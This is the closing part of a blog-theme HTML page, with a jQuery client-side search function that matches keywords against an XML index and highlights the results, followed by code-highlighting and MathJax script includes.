        // åˆå§‹åŒ–æœç´¢ä¸åŒ¹é…å‡½æ•°
        var initSearch = function(path, search_id, content_id) {
            'use strict';
            $.ajax({
                url: path,
                dataType: "xml",
                success: function(xmlResponse) {
                    // get the contents from search data
                    var datas = $("entry", xmlResponse).map(function() {
                        return {
                            title: $("title", this).text(),
                            content: $("content", this).text(),
                            url: $("url", this).text()
                        };
                    }).get();
                    var $input = document.getElementById(search_id);
                    var $resultContent = document.getElementById(content_id);
                    $input.addEventListener('input', function() {
                        var str = '<ul class=\"search-result-list\">';
                        var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                        $resultContent.innerHTML = "";
                        if (this.value.trim().length <= 0) {
                            return;
                        }
                        // perform local searching
                        datas.forEach(function(data) {
                            var isMatch = true;
                            var content_index = [];
                            var data_title = data.title.trim().toLowerCase();
                            var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                            var data_url = data.url;
                            var index_title = -1;
                            var index_content = -1;
                            var first_occur = -1;
                            // only match artiles with not empty titles and contents
                            if (data_title != '' && data_content != '') {
                                keywords.forEach(function(keyword, i) {
                                    index_title = data_title.indexOf(keyword);
                                    index_content = data_content.indexOf(keyword);
                                    if (index_title < 0 && index_content < 0) {
                                        isMatch = false;
                                    } else {
                                        if (index_content < 0) {
                                            index_content = 0;
                                        }
                                        if (i == 0) {
                                            first_occur = index_content;
                                        }
                                    }
                                });
                            }
                            // show search results
                            if (isMatch) {
                                keywords.forEach(function(keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    data_title = data_title.replace(regS, "<span class=\"search-keyword pink lighten-2\">" + keyword + "</span>");
                                });

                                str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                                var content = data.content.trim().replace(/<[^>]+>/g, "");
                                if (first_occur >= 0) {
                                    // cut out 100 characters
                                    var start = first_occur - 20;
                                    var end = first_occur + 80;
                                    if (start < 0) {
                                        start = 0;
                                    }
                                    if (start == 0) {
                                        end = 100;
                                    }
                                    if (end > content.length) {
                                        end = content.length;
                                    }
                                    var match_content = content.substring(start, end);
                                    // highlight all keywords
                                    keywords.forEach(function(keyword) {
                                        var regS = new RegExp(keyword, "gi");
                                        match_content = match_content.replace(regS, "<span class=\"search-keyword pink lighten-2\">" + keyword + "</span>");
                                    });

                                    str += "<p class=\"search-result\">..." + match_content + "...</p>"
                                }
                                str += "</li>";
                            }
                        });
                        str += "</ul>";
                        $resultContent.innerHTML = str;
                    });
                }
            });
        }
    })(jQuery);
</script>


<script src="/js/prettify.js"></script>
<script type="text/javascript">
    $(document).ready(function() {
        $("pre").addClass("prettyprint");
        prettyPrint();
    });
</script>






<script type="text/x-mathjax-config">
MathJax.Hub.Config({
  tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]}
});
</script>
<script type="text/javascript" async
  src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML">
</script>



</body>
</html>
